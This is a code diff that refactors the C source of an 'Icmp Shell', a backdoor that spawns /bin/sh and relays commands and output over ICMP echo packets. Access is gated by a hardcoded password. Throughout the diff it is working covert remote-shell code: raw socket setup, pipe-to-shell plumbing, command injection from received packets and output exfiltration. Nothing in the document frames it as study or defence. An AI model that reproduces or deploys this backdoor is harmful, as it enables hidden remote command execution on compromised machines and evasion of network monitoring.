@@ -26,26 +26,8 @@ todo:
     spilt lage data into mutil packet 
     when sh exit  restart shell 
 */
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/stat.h>
-#include <netinet/in.h>
-#include <netinet/ip_icmp.h>
-#include <netinet/ip.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/epoll.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <pthread.h>
-#include <sys/ioctl.h>
-#include <errno.h>
-#include <sys/wait.h>
-#include <sys/time.h>
-#include <time.h>
+#include "icmp_shell.h"
+#include "buffer.h"
 
 typedef unsigned int uint32;
 typedef unsigned short uint16;
@@ -83,8 +65,10 @@ char *g_Request = NULL;//请求的数据吧
 char *g_password = "sincoder"; //通信的密码
 char *g_hello_msg = "\x2BIcmp Shell V1.0 \nBy: sincoder \n";
 uint32 g_bind_ip = 0;
-char g_output_buffer[MAX_BUFF_SIZE] = {0};  //缓存要发送的数据
+//char g_output_buffer[MAX_BUFF_SIZE] = {0};  //缓存要发送的数据
 pthread_mutex_t g_output_mutex;
+
+buffer_context g_output_buffer = {0};
 
 void MySleep(uint32 msec)
 {
@@ -201,11 +185,11 @@ int  icmp_sendrequest(int icmp_sock, uint32 ip, uint8 *pdata, uint32 size)
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = ip;
 
-    icmp->checksum = 0x00; // echo replay
+    icmp->checksum = 0x00; 
     icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);
 
     // send reply
-    nbytes = sendto(g_icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));
+    nbytes = sendto(icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));
     if (nbytes == -1)
     {
         perror("sendto");
@@ -252,6 +236,7 @@ void *Icmp_RecvThread(void *lparam)
         {
             // get ip and icmp header and data part
             ip = (struct iphdr *) in_buf;
+            dbg_msg("%s: recv a icmp packet from %s \n",__func__,iptos(ip->saddr));
             if (nbytes > sizeof(struct iphdr) && ip->saddr !=  inet_addr("127.0.0.1"))  //过滤掉本地 ip 的
             {
                 int iplen = ip->ihl * sizeof(unsigned int);
@@ -262,7 +247,6 @@ void *Icmp_RecvThread(void *lparam)
                 {
                     if (0 == icmp->code) //  icmp echo msg
                     {
-                        dbg_msg("%s recv a icmp echo msg !! \n", __func__);
                         if (0 == icmp->type) //replay
                         {
                             struct packet_header *phdr = (struct packet_header *)(icmp + 1);
@@ -286,7 +270,11 @@ void *Icmp_RecvThread(void *lparam)
                                     // 写到 shell 里面
                                     len = strlen(data);
                                     data[len] = '\n';  //发来的命令 里面 应该 不能含有 \n
-                                    write(write_pipe[1], data, len + 1);
+                                    if(-1 == write(write_pipe[1], data, len + 1))
+                                    {
+                                        dbg_msg("%s:write failed !! \n",__func__);
+                                        break;
+                                    }
                                     //fflush(stdout);
                                 }
                                 //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的
@@ -351,17 +339,9 @@ void *ShellPipe_ReadThread(void *lparam)
     {
         buff[nBytes] = 0;
         dbg_msg("%s: recv %d bytes from pipe: %s \n", __func__, nBytes, buff);
-        //SendData(buff,nBytes);
         //把读到的数据放到全局的缓冲区中
         pthread_mutex_lock(&g_output_mutex);
-        if (nBytes + strlen(g_output_buffer) <= MAX_BUFF_SIZE)
-        {
-            strcat(&g_output_buffer[0], buff);
-        }
-        else
-        {
-            dbg_msg("%s:out buffer size too small \n", __func__);
-        }
+        buffer_write(&g_output_buffer,&buff[0],nBytes);
         pthread_mutex_unlock(&g_output_mutex);
     }
     dbg_msg("%s: thread exit ... \n", __func__);
@@ -423,9 +403,9 @@ int main(int argc, char **argv)
 {
     int pid;
     g_MyName = argv[0]; //保存下
-    atexit(OnExit);
+    //atexit(OnExit);
     // create raw ICMP socket
-    g_icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (g_icmp_sock == -1)
     {
         perror("socket");
@@ -444,6 +424,7 @@ int main(int argc, char **argv)
     {
         //进入子进程
         //启动 shell 进程
+        close(g_icmp_sock); // child do not need 
         close(read_pipe[0]);
         close(write_pipe[1]);
         char *argv[] = {"/bin/sh", NULL};
@@ -459,8 +440,9 @@ int main(int argc, char **argv)
         pthread_t hShellRead;
         close(read_pipe[1]);
         close(write_pipe[0]);
-        dbg_msg("child process id %d \n", pid);
 
+        buffer_init(&g_output_buffer);
+        dbg_msg("child process id %d \n", pid);
         pthread_mutex_init(&g_output_mutex, NULL);
         //启动一个线程来读取
         hIcmpRecv = MyCreateThread(Icmp_RecvThread, NULL);
@@ -470,11 +452,15 @@ int main(int argc, char **argv)
             dbg_msg("%s:Create Thread exit ... \n", __func__);
         }
         waitpid(pid, NULL, 0); //等待子进程退出
+        dbg_msg("%s:child exit. ..\n", __func__);
+        //write(g_icmp_sock,"sincoder",8);
+        icmp_sendrequest(g_icmp_sock,inet_addr("127.0.0.1"),"sincoder",8);
+        close(g_icmp_sock); //tell the icmp_recv thread exit ...
         close(read_pipe[0]);
         close(write_pipe[1]);
+        dbg_msg("%s:wait thread exit ...\n",__func__);
         pthread_join(hIcmpRecv, NULL); //线程会因为上面的句柄关闭 而退出
         pthread_join(hShellRead, NULL);
-        dbg_msg("%s:child exit. ..\n", __func__);
     }
     return 0;
 }
